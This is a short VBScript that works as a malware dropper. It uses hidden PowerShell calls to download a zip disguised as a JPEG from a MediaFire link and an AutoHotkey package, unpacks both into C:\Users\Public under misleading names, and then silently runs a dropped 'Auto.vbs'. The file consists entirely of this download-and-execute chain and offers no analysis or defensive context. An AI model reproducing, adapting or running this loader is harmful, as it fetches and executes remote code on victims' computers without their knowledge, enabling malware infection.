Dim Shell, Cmd
Set Shell = CreateObject("WScript.Shell")
Function DownloadAndExtract(url, zipPath, extractPath)
    Dim DownloadCmd, ExtractCmd
    DownloadCmd = "powershell.exe Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "'"
    Shell.Run DownloadCmd, 0, True
    ExtractCmd = "powershell.exe Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractPath & "'"
    Shell.Run ExtractCmd, 0, True
End Function
DownloadAndExtract "https://www.mediafire.com/file/qr769p7fnrst5zd/xw.jpg/file", "C:\Users\Public\bbbb.zip", "C:\Users\Public"
DownloadAndExtract "https://www.autohotkey.com/download/1.1/AutoHotkey112304_ansi.zip", "C:\Users\Public\chrome.zip", "C:\Users\Public\"

WScript.Sleep 3000

filePath = "C:\Users\Public\Auto.vbs"
parameter = ""
shell.Run """" & filePath & """ """ & parameter & """"